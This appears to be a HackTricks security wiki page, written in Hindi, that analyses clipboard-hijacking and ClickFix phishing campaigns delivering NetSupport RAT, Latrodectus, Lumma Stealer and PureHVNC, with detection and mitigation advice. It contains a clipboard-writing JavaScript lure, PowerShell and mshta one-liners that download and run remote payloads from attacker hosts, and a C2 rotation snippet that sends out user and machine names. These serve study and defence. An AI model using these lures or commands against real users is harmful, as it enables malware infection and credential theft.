# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "कभी भी कोई चीज़ पेस्ट न करें जो आपने स्वयं कॉपी नहीं की हो।" – पुरानी पर अब भी प्रासंगिक सलाह

## अवलोकन

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि उपयोगकर्ता सामान्यतः commands को बिना जाँच किए copy-and-paste कर लेते हैं। एक दुर्भावनापूर्ण वेब पेज (या कोई भी JavaScript-capable context जैसे Electron या Desktop application) प्रोग्रामेटिक रूप से attacker-controlled text को system clipboard में रख देता है। पीड़ितों को आमतौर पर सावधानीपूर्वक तैयार किए गए social-engineering निर्देशों द्वारा प्रेरित किया जाता है कि वे **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाएँ, या एक terminal खोलें और *paste* करके clipboard की सामग्री चिपकाएँ, जिससे तुरंत arbitrary commands निष्पादित हो जाते हैं।

क्योंकि **कोई file डाउनलोड नहीं होता और कोई attachment open नहीं किया जाता**, यह technique उन अधिकांश e-mail और web-content security controls को बायपास कर देती है जो attachments, macros या direct command execution की मॉनिटरिंग करते हैं। इसलिए यह attack phishing campaigns में लोकप्रिय है जो commodity malware परिवारों जैसे NetSupport RAT, Latrodectus loader या Lumma Stealer पहुँचाते हैं।

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
पुरानी कैंपेन `document.execCommand('copy')` का उपयोग करती थीं, जबकि नए संस्करण असिंक्रोनस **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करते हैं।

## ClickFix / ClearFake प्रवाह

1. उपयोगकर्ता किसी typosquatted या compromised साइट पर जाता है (उदा. `docusign.sa[.]com`)
2. इंजेक्ट किया गया **ClearFake** JavaScript `unsecuredCopyToClipboard()` हेल्पर को कॉल करता है जो चुपचाप क्लिपबोर्ड में एक Base64-encoded PowerShell one-liner स्टोर कर देता है।
3. HTML निर्देश पीड़ित को बताते हैं: *“Press **Win + R**, कमांड पेस्ट करें और समस्या को सुलझाने के लिए Enter दबाएँ।”*
4. `powershell.exe` चलती है, एक आर्काइव डाउनलोड करती है जिसमें एक legitimate executable और एक malicious DLL होता है (classic DLL sideloading)।
5. लॉडर अतिरिक्त stages को decrypt करता है, shellcode inject करता है और persistence इंस्टॉल करता है (उदा. scheduled task) – अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।

### NetSupport RAT श्रृंखला का उदाहरण
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (वैध Java WebStart) अपनी डायरेक्टरी में `msvcp140.dll` की खोज करता है।
* दुष्ट DLL डायनामिक रूप से **GetProcAddress** के साथ APIs को resolve करता है, **curl.exe** के माध्यम से दो binaries (`data_3.bin`, `data_4.bin`) डाउनलोड करता है, उन्हें rolling XOR key `"https://google.com/"` का उपयोग करके decrypt करता है, अंतिम shellcode inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में unzip करता है।

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** के साथ `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader को निष्पादित करता है
3. MSI payload प्राप्त करता है → signed application के पास `libcef.dll` गिराता है → DLL sideloading → shellcode → Latrodectus।

### Lumma Stealer MSHTA के माध्यम से
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** कॉल एक छिपा हुआ PowerShell script लॉन्च करती है जो `PartyContinued.exe` को प्राप्त करती है, `Boat.pst` (CAB) को निकालती है, `extrac32` & file concatenation के माध्यम से `AutoIt3.exe` को पुनर्निर्मित करती है और अंत में एक `.a3x` script चलाती है जो ब्राउज़र credentials को `sumeriavgv.digital` पर exfiltrates करती है।

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix campaigns पूरी तरह से file downloads को छोड़ देते हैं और पीड़ितों को निर्देश देते हैं कि वे एक one‑liner पेस्ट करें जो WSH के माध्यम से JavaScript को fetch और execute करता है, इसे persists करता है, और रोज़ाना C2 rotate करता है। देखा गया उदाहरण शृंखला:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- Obfuscated URL को runtime पर reverse किया जाता है ताकि साधारण निरीक्षण नाकाम हो सके।
- JavaScript अपने आप को Startup LNK (WScript/CScript) के माध्यम से स्थायी करता है, और वर्तमान दिन के अनुसार C2 चुनता है — जिससे तेज domain rotation सक्षम होता है।

C2s को date के अनुसार rotate करने के लिए उपयोग किया गया Minimal JS fragment:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
अगला चरण आम तौर पर एक लोडर तैनात करता है जो persistence स्थापित करता है और एक RAT (e.g., PureHVNC) को प्राप्त करता है, अक्सर TLS को एक hardcoded प्रमाणपत्र पर पिन करता है और ट्रैफ़िक को chunk करता है।

Detection ideas specific to this variant
- प्रोसेस ट्री: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (या `cscript.exe`)।
- Startup artifacts: LNK `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` में जिसमें WScript/CScript को `%TEMP%`/`%APPDATA%` के अंतर्गत एक JS पाथ देता है।
- Registry/RunMRU और command‑line telemetry जिनमें `.split('').reverse().join('')` या `eval(a.responseText)` शामिल हों।
- बार-बार `powershell -NoProfile -NonInteractive -Command -` का उपयोग बड़े stdin payloads के साथ ताकि लंबी स्क्रिप्ट्स बिना लंबे command lines के फीड हों।
- Scheduled Tasks जो बाद में LOLBins जैसे `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` को एक updater‑लुकिंग task/path (उदाहरण के लिए, `\GoogleSystem\GoogleUpdater`) के तहत चलाते हैं।

Threat hunting
- दैनिक-रोटेट होने वाले C2 hostnames और URLs जिनमें `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` पैटर्न हो।
- clipboard write इवेंट्स को correlate करें जो Win+R paste के बाद और तत्क्षण `powershell.exe` execution के साथ होते हों।


ब्लू-टीम्स clipboard, process-creation और registry telemetry को मिलाकर pastejacking злоप्रयोग को सटीक रूप से पहचान सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` Win + R कमांड्स का इतिहास रखता है – असामान्य Base64 / obfuscated एंट्रियों की तलाश करें।
* Security Event ID **4688** (Process Creation) जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` उन में से एक हो { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }।
* Event ID **4663** उन फाइल क्रिएशंस के लिए जो `%LocalAppData%\Microsoft\Windows\WinX\` या अस्थायी फ़ोल्डरों में suspicious 4688 इवेंट से ठीक पहले होती हैं।
* EDR clipboard sensors (यदि मौजूद हों) – `Clipboard Write` को तुरंत नए PowerShell प्रोसेस के साथ correlate करें।

## Mitigations

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) को अक्षम करें या user gesture आवश्यक करें।
2. Security awareness – उपयोगकर्ताओं को सिखाएँ कि संवेदनशील कमांड्स को टाइप करें या पहले किसी text editor में पेस्ट करें।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ताकि arbitrary one-liners को ब्लॉक किया जा सके।
4. Network controls – जाने-माने pastejacking और malware C2 domains के लिए outbound requests को ब्लॉक करें।

## Related Tricks

* **Discord Invite Hijacking** अक्सर उपयोगकर्ताओं को किसी malicious server में लुभाने के बाद उसी ClickFix तरीके का दुरुपयोग करता है:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
